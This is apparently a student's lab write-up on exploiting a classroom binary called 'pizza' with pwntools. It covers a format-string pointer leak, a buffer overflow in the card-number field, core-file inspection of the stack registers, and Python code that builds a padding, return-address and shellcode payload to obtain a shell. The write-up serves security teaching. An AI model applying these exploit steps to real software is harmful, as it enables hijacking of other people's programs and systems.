# Control Flow Violation

This week was about using pwntools to insert a shell into a victim process. This task consisted of a couple of steps. First we need to find a memory leak to learn where our program runs
. We then need to identify a buffer that is not properly managed to write to the stack. Finally we need to identify where to write to ret and input our shellcode. 

### Step 1: find vulnerabilities

The first task was to run our victim code and identify the key vulnerabilities. 

#### The memory leak

In order to find a memory leak we had to identify potential week points in the code. For example, our victim code pizza when ran appears to step through a pizza ordering porcess. 
It requests a name a number of pizzas and the card number. 

To test these features we gave each of them potentially breaking tests. In this case I gave name a large ammount of A's as the name to see if memory control was properly setup. 
In this case it was found to not be. 

![image](https://user-images.githubusercontent.com/44854053/235506419-a2dd782c-e779-412c-ab82-475fad098dfa.png)

In this we can also see that it segment faults post a print statement. In this case I assumed based on teachers instructions that this might be printf. 
Assuming that this is printf if it is not properly protected we can get more data from it. By sending a valid looking name followed by ```%p %p ... ``` we can ask the program to 
print pointers. This will allow us to see farther in the stack and see memory adresses or a memory leak. Fromt here it was trial and error to see how many pointers we needed to 
see an address that was most likely on the stack. We could compare this to adresses generated in the core file after we force segmentation faults. 


This leads to our first part of code which uses the ```%p``` to find the memory adress.

```py

input1 = b"Cantinflas %p %p %p %p %p %p %p"

victim = process("./pizza")

#memory leak
print(str(victim.recvline(), "latin-1"))
victim.sendline(input1)
leak = str(victim.recvline(), "latin-1").split()[-1]
print(leak)
leak_int = int(leak,16)

```

#### The second un-secured buffer

Finding the memory leak was important beacuse it allows us to locate the potential range of our attack vector. Where we can insert the shellcode and its address. But perhaps e
qually as important is finding a second buffer that is also unsecured such that we can overflow back to the return pointers. 

This meant returnning to our victim process and seeing at what further points in the program that it could break. The first potential point was the number of pizzas however even though there was not proper type casting/input validation it seemed unlikely to contain what we need. 

![image](https://user-images.githubusercontent.com/44854053/235508426-c79d969f-698d-4e34-9882-cd82a101a23b.png)


The next place was the credit card number request.  I used a similair method to before to check for a potential overflow spot and it worked. 

![image](https://user-images.githubusercontent.com/44854053/235508731-578d7e03-85f6-4195-9b29-91a7e51d90f9.png)


### Step 2: Identifying where to write 

From step 1 we have Identified both of the needed vulnerabilities. The next step is to use these vulnerabilities as well as core files to write our shellcode and a return pointer to it. 

#### Identifying where to write. 

From there we forced segmentation faults to create core files. We do this because we want to validate the memory address of where the program is running as well as the stack locations of the RSP RIP and RBP.

![image](https://user-images.githubusercontent.com/44854053/235513424-9528fd54-605e-4eea-8959-b7b8aa61a329.png)

we get this information by slightly overwriting the buffer as well as generating the core file by using this code segment

```py 

#generate a core file to check key value
core = victim.corefile
rsp = core.rsp
rbp = core.rbp

rip = core.rip
#read at rsp 8 bytes,then at +8 rsp then at +8 that
topostack = core.read(rsp,8)
topostack_1 = core.read(rsp+8,8)
topostack_2 = core.read(rsp+16,8)

#gettin the memory adresses
print(f"rsp: {hex(rsp)}")
print(f"rbp: {hex(rbp)}")
print(f"rip: {hex(rip)}")


print(f"Top of stack contains:{hex(int.from_bytes(topostack,'little'))}")
print(f"Top of stack +1 contains:{hex(int.from_bytes(topostack_1,'little'))}")
print(f"Top of stack +2 contains:{hex(int.from_bytes(topostack_2,'little'))}")
print(f"I think the shellcode is at:{hex(shellcodeplace)}")

```

From the core file I fine tuned the number of bytes until we could see the shellcode near where we want it. 

### Completing the injection

From there it was a matter of generating tests and potential sizes of bufferoverflow to write. This included predicting where our overwritten rsp would point to the shellcode. 

![image](https://user-images.githubusercontent.com/44854053/235514687-caa97db4-3da9-49b8-95d9-b1a4bb90f137.png)

By trial and error we could see that the adress generated from our memory leak tended to be hex 20 from our predicted. We then used the following code to generate the overflow we then use the interactive command to check that our shellcode was properly injected. It also allows us to run multiple commands in the shellcode.

```py
#by looking at our prints we can see shell at top of stack is +10 
#from our memory leak we want to put this in rip for the return
shellcodeplace = leak_int + 0x20

#the buffer overflow
#we need between 130 & 150 bytes
input2 =  b"A"*128 + b"ZZZZZZZZ"+ p64(shellcodeplace) + shellcode 
victim.sendline(input2)

print(str(victim.recvline(), "latin-1"))

#victim.sendline(payload)
victim.interactive()

```
I then tested this by running the program multiple times. 

![image](https://user-images.githubusercontent.com/44854053/235515385-c305f384-e6fd-4d39-9c83-4f5466175183.png)


![image](https://user-images.githubusercontent.com/44854053/235515318-a3df19bc-ad3f-4b18-b9f5-99808b7e6d9b.png)

## The completed program ![code](./controlflowviolation/inject.py)
